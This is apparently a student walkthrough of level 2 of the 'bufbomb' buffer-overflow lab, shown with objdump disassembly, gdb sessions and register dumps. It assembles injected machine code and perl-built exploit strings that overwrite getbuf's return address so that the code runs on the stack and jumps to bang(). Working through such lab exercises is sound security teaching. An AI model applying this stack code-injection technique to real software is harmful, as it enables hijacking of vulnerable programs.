Level 2
=======

Goal = inject machine instructions onto the stack, have those instructions execute and then redirect function getbuf() to function bang()

To find the address of function ```bang()``` type:
```unix> objdump -d bufbomb | less```

and use ```f``` to go forward and ```b``` to go backwards until you find bang():

```
08049012 <bang>:
 8049012:       55                      push   %ebp
 8049013:       89 e5                   mov    %esp,%ebp
 8049015:       83 ec 18                sub    $0x18,%esp
 8049018:       a1 ec c1 04 08          mov    0x804c1ec,%eax <=== 1)
 804901d:       3b 05 e4 c1 04 08       cmp    0x804c1e4,%eax <=== 2)
 8049023:       75 1e                   jne    8049043 <bang+0x31>
 8049025:       89 44 24 04             mov    %eax,0x4(%esp)
 8049029:       c7 04 24 58 a1 04 08    movl   $0x804a158,(%esp)
 8049030:       e8 ab f8 ff ff          call   80488e0 <printf@plt>
 8049035:       c7 04 24 02 00 00 00    movl   $0x2,(%esp)
 804903c:       e8 93 00 00 00          call   80490d4 <validate>
 8049041:       eb 10                   jmp    8049053 <bang+0x41>
 8049043:       89 44 24 04             mov    %eax,0x4(%esp)
 8049047:       c7 04 24 69 9f 04 08    movl   $0x8049f69,(%esp)
 804904e:       e8 8d f8 ff ff          call   80488e0 <printf@plt>
 8049053:       c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 804905a:       e8 31 f9 ff ff          call   8048990 <exit@plt>

 ```
<b>write down the address of bang(). Mine is 08049012</b>

Now type:

```
unix> perl -e 'print "AA "x44, "08 04 90 12 " ' > hexlevel2
unix> ./hex2raw < hexlevel2 > raw
unix> gdb bufbomb
(gdb) break getbuf
(gdb) run -u quinnliu < raw
```

Now use the gdb examine command ```x``` to locate the address and the value held for the variable ```global_value``` by typing:

```
(gdb) x/x &global_value
```

Gives you:

```
(gdb) x/x &global_value
0x804c1ec <global_value>:       0x00000000
```

Now break bang() and show disassembly:
```
(gdb) break bang
(gdb) cont
(gdb) disas
```

Break bang() returns 0x08049018????????????????

(gdb) cont
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x18900408 in ?? ()

From level 1 calculations get your little endian id. Mine is: 0x 0c c7 8c 2d

More specific goal = 1) replace the value at 0x804c1ec with my cookie as the little endian id. 2) push the return address to bang() onto the stack 3) return

Since we now now the address of the global variable cookie we can create an assembly instruction to mov my cookie value into the location of global_value. 

This can be done by writing the assembly instructions into a .s file, compiling to a binary .o file. Disassemblying the binary file to get the hex that will be used for the exploit string.

First create the file assemblylevel2.s with the following contents:
```
movl $0x0cc78c2d, 0x0804c1ec # move cookie to global_variable
pushl $0x08049012            # push address of bang()
ret                          # return to address bang()
```

then type:
```
unix> gcc -m32 -c assemblylevel2.s
unix> objdump -d assemblylevel2.o > assemblylevel2.d
unix> cat assemblylevel2.d
```

Gives you:
```
assemblylevel2.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   c7 05 ec c1 04 08 2d    movl   $0xcc78c2d,0x804c1ec
   7:   8c c7 0c
   a:   68 12 90 04 08          push   $0x8049012
   f:   c3                      ret
```

Now that I have the hex representation of the assembly to manipulate the bufbomb binary I can put this into the buffer overflow so that it is pushed onto the stack and is executed.

But before I correctly push instructions onto the stack I first have to tell the binary bufbomb where to look for my new instructions. 

Let's first just add the new assembly instructions to see where they are on the stack by typing:
```
perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "EE "x4, "c7 05 ec c1 04 08 2d 8c c7 0c 68 12 90 04 08 c3 " ' > hexlevel2_2
```

Now create the corresponding raw file and use it as the new input for the bufbomb:
```
unix> ./hex2raw < hexlevel2_2 > raw
unix> gdb bufbomb
(gdb) break *getbuf+17
(gdb) run -u quinnliu < raw
(gdb) i r
```

Gives you:
```
(gdb) i r
eax            0x55683328       1432892200
ecx            0xa      10
edx            0xaec334 11453236
ebx            0x0      0
esp            0x55683318       0x55683318
ebp            0x55683350       0x55683350
esi            0x55686018       1432903704
edi            0xc60    3168
eip            0x8048c15        0x8048c15 <getbuf+17>
eflags         0x212    [ AF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```

Now let's take a look inside $esp with:
```x/20x $esp```

Gives you 20 words to examine from $esp:
```
(gdb) x/20x $esp
0x55683318 <_reserved+1037080>: 0x55683328      0x0098db36      0x00aeb32c      0x55683328
0x55683328 <_reserved+1037096>: 0x61616161      0x61616161      0x61616161      0x61616161
0x55683338 <_reserved+1037112>: 0x61616161      0x61616161      0x61616161      0x61616161
0x55683348 <_reserved+1037128>: 0xbbbbbbbb      0xcccccccc      0xdddddddd      0xeeeeeeee
0x55683358 <_reserved+1037144>: 0xc1ec05c7      0x8c2d0804      0x12680cc7      0xc3080490
```

The address in %ebp is at 0x55683350 which means it is overwritten by 0xdddddddd. The return address of %ebp is also overwritten by 0xeeeeeeee. We can also see our assembly instructions are now on the stack.

In order for the exploit to work, the buffer overflow will have to push the return address of the beginning of the exploit. Looking at the stack shows where the beginning of the exploit starts (0xeeeeeeee). So just replace 0xeeeeeeee with the little endian hex representation of the address where we begin our string exploit at 0x55683358.

0x 55 68 33 58 # is the original order
0x 58 33 68 55 # is the little endian order

Create the new input file by typing:
```
perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "58 33 68 55 ", "c7 05 ec c1 04 08 2d 8c c7 0c 68 12 90 04 08 c3 " ' > hexlevel2_3
```



